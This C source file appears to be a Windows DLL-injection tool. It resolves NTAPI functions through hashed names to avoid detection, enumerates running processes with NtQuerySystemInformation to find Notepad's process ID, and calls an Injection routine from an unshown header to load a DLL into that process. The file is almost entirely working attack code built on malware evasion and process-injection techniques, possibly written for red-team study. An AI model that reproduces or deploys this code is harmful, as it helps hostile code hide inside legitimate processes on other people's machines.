#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "injection.h"


unsigned long find_pid(const char* process_name) {
    HMODULE hNtdll = GetNtDllBaseAddress();
    
    fn_NtQuerySystemInformation pNtQuerySystemInformation = 
        (fn_NtQuerySystemInformation)GetProcAddressByHash(hNtdll, 0x8E2C1AA0); // "ntquerysysteminformation"
    
    fn_NtAllocateVirtualMemory pNtAllocateVirtualMemory = 
        (fn_NtAllocateVirtualMemory)GetProcAddressByHash(hNtdll, 0xc66d2fcc); // "ntallocatevirtualmemory"
        
    fn_NtFreeVirtualMemory pNtFreeVirtualMemory = 
        (fn_NtFreeVirtualMemory)GetProcAddressByHash(hNtdll, 0x0c6a2f1b); // "ntfreevirtualmemory"

    if (!pNtQuerySystemInformation || !pNtAllocateVirtualMemory || !pNtFreeVirtualMemory) {
        printf("[-] Failed to resolve NTAPI functions for process enumeration\n");
        return 0;
    }

// Allocate memory with NtAllocateVirtualMemory for this process with (Handle)-1
    SIZE_T bufferSize = 0x10000; // Bắt đầu với 64KB
    PVOID buffer = NULL;
    NTSTATUS status = pNtAllocateVirtualMemory((HANDLE)-1, &buffer, 0, &bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0 || !buffer) return 0;

    // 3. Query thông tin tất cả process (Class 5 = SystemProcessInformation)
    ULONG returnLength = 0;
    status = pNtQuerySystemInformation(5, buffer, (ULONG)bufferSize, &returnLength);

// If the buffer is too small, reallocate it with the correct size
    while (status == 0xC0000004L) { // STATUS_INFO_LENGTH_MISMATCH
        SIZE_T freeSize = 0;
        pNtFreeVirtualMemory((HANDLE)-1, &buffer, &freeSize, MEM_RELEASE);
        
        bufferSize = returnLength;
        buffer = NULL;
        status = pNtAllocateVirtualMemory((HANDLE)-1, &buffer, 0, &bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (status != 0 || !buffer) return 0;
        
        status = pNtQuerySystemInformation(5, buffer, (ULONG)bufferSize, &returnLength);
    }

    if (status != 0) {
        SIZE_T freeSize = 0;
        pNtFreeVirtualMemory((HANDLE)-1, &buffer, &freeSize, MEM_RELEASE);
        return 0;
    }

// Enumerate through the process information structures to find the target process
    PSYSTEM_PROCESS_INFORMATION pInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
    while (TRUE) {
        // Check if the ImageName is not NULL and compare it with the target process name
        if (pInfo->ImageName.Buffer != NULL) {
            // Convert UNICODE_STRING to ANSI for comparison
            char imageNameAnsi[256] = {0};
            int len = pInfo->ImageName.Length / sizeof(WCHAR);
            if (len > 255) len = 255; // Ensure the buffer is not overflowed
            
            for (int i = 0; i < len; i++) {
                imageNameAnsi[i] = (char)pInfo->ImageName.Buffer[i];
            }
            
            // Compare the process name (case-insensitive)
            if (_stricmp(imageNameAnsi, process_name) == 0) {
                ULONG pid = (ULONG)(ULONG_PTR)pInfo->UniqueProcessId;
                
                // Free the allocated memory before returning the PID
                SIZE_T freeSize = 0;
                pNtFreeVirtualMemory((HANDLE)-1, &buffer, &freeSize, MEM_RELEASE);
                return pid;
            }
        }
        
        // If NextEntryOffset is 0, we've reached the last entry
        if (pInfo->NextEntryOffset == 0) break;
        
        // Move to the next process
        pInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pInfo + pInfo->NextEntryOffset);
    }

    // Free the allocated memory before returning 0
    SIZE_T freeSize = 0;
    pNtFreeVirtualMemory((HANDLE)-1, &buffer, &freeSize, MEM_RELEASE);
    return 0;
}


int main(void) {
    // ImageName in NtQuerySystemInformation usually does not include .exe
    // (Different from tlhelp32). So we search for "Notepad" instead of "Notepad.exe".
    unsigned long pid = find_pid("Notepad"); 
    
    if (pid == 0) {
        printf("[-] Process Notepad not found.\n");
        return EXIT_FAILURE;
    }

    // Calsulate the correct size of the DLL path in bytes, including the null terminator
    SIZE_T pathSize = (wcslen(DLL) + 1) * sizeof(WCHAR);

    if (!Injection(pid, DLL, pathSize)) {
        printf("[-] Injection failed.\n");
        return EXIT_FAILURE;
    }

    printf("[+] Injection successful!\n");
    return EXIT_SUCCESS;
}